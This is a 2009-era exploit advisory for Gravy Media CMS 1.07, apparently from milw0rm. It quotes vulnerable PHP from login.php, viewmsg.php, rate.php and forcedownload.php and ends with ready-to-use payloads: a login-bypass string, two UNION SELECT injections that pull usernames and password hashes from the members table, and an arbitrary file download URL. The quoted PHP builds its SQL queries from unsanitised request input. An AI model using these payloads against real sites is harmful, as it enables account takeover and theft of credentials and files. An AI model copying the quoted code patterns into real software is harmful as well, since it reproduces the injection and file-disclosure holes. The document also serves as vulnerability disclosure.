@@ -1,0 +1,106 @@
+#########################################################################################
+[0x01] Informations:
+Name           : Gravy Media Cms 1.07
+Download       : http://www.gravy-media.com/downloads.php
+Vulnerability  : Multiple Sql Injections & Arbitrary File Download
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud To Be Italian
+Greetz         : //
+#########################################################################################
+[0x02] Bug:
+Bugged file is /[path]/login.php [..] viewmsg.php [..] rate.php [..]forcedownload.php
+
+[code]
+//IF SUBMIT PRESSED FOR LOGIN 
+if(isset($_POST['submit'])) {
+
+$get_app = mysql_query("SELECT * FROM `members` WHERE username = '".$_POST['username']."' AND 
+user_password = '".md5($_POST['password'])."'");
+[/code]
+
+[code]
+ //you've to be logged
+        //We need to grab the msg_id variable from the URL.
+        $msg_id = $_REQUEST['msg_id'];
+        
+        //Get all of the information about the message with and id number of the one sent through the URL
+        $view_msg = mysql_query("SELECT * FROM messages WHERE id = '$msg_id'");
+        $msg = mysql_fetch_array($view_msg);
+		
+[/code]
+
+[code]
+
+include "connect.php";
+$action = $_GET["action"];
+if (!$action)
+  $action = $_POST["action"];
+
+//print"action = $action";
+
+if ($action == "rate"){
+$filename = $_GET["file"];
+$getcount = mysql_query("SELECT * FROM files WHERE image='$filename'"); 
+ [/code]
+ 
+ [code]
+ 
+ 
+$filename = $_GET['file'];
+
+//Huge thank you to eLouai for this simple but powerful add-on
+
+// required for IE, otherwise Content-disposition is ignored
+if(ini_get('zlib.output_compression'))
+  ini_set('zlib.output_compression', 'Off');
+
+// addition by Jorg Weske
+$file_extension = strtolower(substr(strrchr($filename,"."),1));
+
+if( $filename == "" ) 
+{
+  echo "<html><title>eLouai's Download Script</title><body>ERROR: download file NOT SPECIFIED. USE force-download.php?file=filepath</body></html>";
+  exit;
+} elseif ( ! file_exists( $filename ) ) 
+{
+  echo "<html><title>eLouai's Download Script</title><body>ERROR: File not found. USE force-download.php?file=filepath</body></html>";
+  exit;
+};
+switch( $file_extension )
+{
+  case "pdf": $ctype="application/pdf"; break;
+  case "exe": $ctype="application/octet-stream"; break;
+  case "zip": $ctype="application/zip"; break;
+  case "doc": $ctype="application/msword"; break;
+  case "xls": $ctype="application/vnd.ms-excel"; break;
+  case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
+  case "gif": $ctype="image/gif"; break;
+  case "png": $ctype="image/png"; break;
+  case "jpeg":
+  case "jpg": $ctype="image/jpg"; break;
+  default: $ctype="application/force-download";
+}
+header("Pragma: public"); // required
+header("Expires: 0");
+header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+header("Cache-Control: private",false); // required for certain browsers 
+header("Content-Type: $ctype");
+// change, added quotes to allow spaces in filenames, by Rajkumar Singh
+header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
+header("Content-Transfer-Encoding: binary");
+header("Content-Length: ".filesize($filename));
+readfile("$filename");
+exit();
+
+[/code]
+ 
+#########################################################################################
+[0x03] Exploits:
+1- admin' or ' 1=1--
+2- [LoginRequired] http://site.it/viewmsg.php?msg_id=' union select 0,0,0,concat(username,char(54),user_password),0,0 from members--
+3- http://site.it/rate.php?action=rate&file=' union select 0,0,0,concat(username,user_password),0,0 from members--
+4- http://site.it/forcedownload.php?file=[file]
+########################################################################################
+
+# milw0rm.com [2009-03-30]
